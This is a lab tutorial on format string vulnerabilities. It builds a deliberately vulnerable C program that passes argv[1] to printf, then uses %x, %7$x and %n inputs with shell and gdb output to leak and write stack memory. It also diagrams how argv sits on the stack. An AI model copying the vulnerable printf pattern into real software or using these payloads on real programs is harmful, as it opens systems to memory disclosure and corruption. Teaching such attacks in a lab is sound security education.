### Info
In this lab, we'll try to exploit format string bugs<br/><br/>
**Environment**: Ubuntu 18.04.3 LTS, ASLR disabled<br>
**Keywords**: format string vulnerability

### Implementation
Format string vulnerabilities occur when a user controlled string is passed to the printf like functions (sprintf, snprintf ...)
as the format parameter.
Here is the minimum example code:
```
int main(int argc, char **argv)
{
    int var = 0xdeadcafe;
    printf(argv[1]);
}
```
#### Increment 1: Exposing data from stack
A valid printf of usage with format specifier is as the following:
```
printf("Integer value is %d\n" , my_int_var);
```
If you omit the second parameter `my_int_var`, printf dumps the content in the next word in stack. On the other hand, if you specify 
more specifiers than the number or arguments, again printf dumps data from stack.

Back to our example source code, before `call printf`, stack will look like below. The more specifier we pass to the program,
the more data we'll expose data from the stack.

``` 
+------------------------+
| address of format str  |
+------------------------+
| ..stack of main..      | 
+------------------------+
| deadcafe               | 
+------------------------+
| ..stack of main..      |
+------------------------+
| old ebp                |
+------------------------+
| ret addr               |
+------------------------+
higher address
```
We expose the data as the following. `;echo` is just added to have a new line after each output. By the way `;` is a seperator to
run multiple commands in one line.
```
uzi@pwnpatrol:$ ./fs '%x' ;echo
0
uzi@pwnpatrol:$ ./fs '%x,%x,%x' ;echo
0,ffffd600,80484bb
uzi@pwnpatrol:$ ./fs '%x,%x,%x,%x,%x,%x' ;echo
0,ffffd600,80484bb,2,ffffd5f4,ffffd600
uzi@pwnpatrol:$ ./fs '%x,%x,%x,%x,%x,%x,%x,%x,%x' ;echo
0,ffffd5f0,80484bb,2,ffffd5e4,ffffd5f0,deadcafe,f7fe59b0,ffffd550
``` 
As you see, we dumped several words in stack (some junk, some meaningful). Our local variable with value `0xdeadcafe` is somewhere around the middle of main function stack.
Format strings has two important features:
* We can specify the nth argument in format string directly. For example `0xdeadcafe` was the 7th word dumbed above. We can dump just it using `%<number>$specifier` syntax:
```
uzi@pwnpatrol:$ ./fs '%7$x'
deadcafe
```
PS: Notice that I used single qoutes around the argument. If you use double quotes, shell will try to expand $x.
* The more interesting feature is that using `n` specifier, the number of characters written so far is stored in the pointed location.
```
uzi@pwnpatrol:$ ./fs 'sample:%7$x' ;echo
sample:deadcafe
```
What will happen if I change the `x` to `n` in format string?
```
uzi@pwnpatrol:$ ./fs 'sample:%7$n' ;echo
Segmentation fault (core dumped)
```
To understand what happened, we can start the binary with gdb and run with 'sample:%7$n'
```
uzi@pwnpatrol:$ gdb -q fs
Reading symbols from fs...(no debugging symbols found)...done.
(gdb) r 'sample:%7$n'
Starting program: /home/uzi/exploit_labs/lab7_format_string/fs 'sample:%7$n'
Program received signal SIGSEGV, Segmentation fault.
0xf7e30745 in ?? () from /lib/i386-linux-gnu/libc.so.6
```
Let's check segfaulting instruction and its operands. As explained above, it tried to write the length(7) of "sample:" to the location
pointed by 7th argument. In this case, it's not a valid address of the process, and therefore program segfaulted.

```
(gdb) x/i $eip
=> 0xf7e30745:  mov    DWORD PTR [eax],esi
(gdb) i r eax esi
eax            0xdeadcafe       -559035650
esi            0x7      7
```
#### Increment 2: Reading any valid address
We need to understand how the program stack looks like with the program arguments. So we enlarge the sample stack above.
I run the binary with 'arg' as parameter: `./fs arg`. Here is the stack just before `call printf`:
```
      +------------+--------------------+
      |  address   |   content          |
      +------------+--------------------+
 /--< | 0xffffd530 | 0xffffd742         |       <-- address of format str
/     +------------+--------------------+
|     |  ....      | ....               | ** |
|     +------------+--------------------+    | 
|     | 0xffffd54c | deadcafe           | ** |   
|     +------------+--------------------+    | main
|     |  ....      | ....               | ** | stack
|     +------------+--------------------+    |
|     |  ....      | ....               | ** | 
|     +------------+--------------------+
|     | 0xfffd56c  | libc_start_main+24 |       <-- return address to libc_start_main
|     +------------+--------------------+
|     | 0xfffd570  | 2                  |       <-- parameters of main: argc
|     +------------+--------------------+
|     | 0xfffd574  | 0xfffd604          | >-\   <-- parameters of main: location of *argv[] array
|     +------------+--------------------+    \  
|     |  ....      | ....               |    |  
|     +------------+--------------------+    |   
|     |  ....      | ....               |    |
|     +------------+--------------------+    /
|     | 0xfffd604  | 0xffffd73e         | <-/  >-\  <-- argv[0] pointer deep in stack
|     +------------+--------------------+         \
|     | 0xfffd608  | 0xffffd742         | >-\     | <-- argv[1] pointer deep in stack 
|     +------------+--------------------+   |     |
|     |  ....      | ....               |   |     |
|     +------------+--------------------+   |     /
|     | 0xffffd73e | 'f','s','\0','\0'  |   |  <-/  <-- argv[0] value "fs"
 \    +------------+--------------------+   |
  \-> | 0xffffd742 | 'a','r', 'g'       | <-/       <-- argv[1] value  
      +------------+--------------------+
```
By following a bottom to top approach, we can understand the stack
* In the deepest level, there's actually environment variables string but I didn't draw them since we are not interested.
* Then comes the command line arguments. Remember that the program itself is the argument zero. Address 0xffffd73e
contains the program name, 0xffffd742 contains the first argument.
* After some unused area, pointers to each environment variable and pointers to each argument. Address 0xfffd604, 0xfffd608 are those pointers to argument zero and argument one.
* The comes some linker variables. After that `main` is to be called. Therefore envp, argv, and argc are pushed to the stack. Therefore
at 0xfffd574, we have the beginning address of argv pointers.
* Due to `printf(argv[1])`, 0xffffd742 pushed to stack before calling printf.
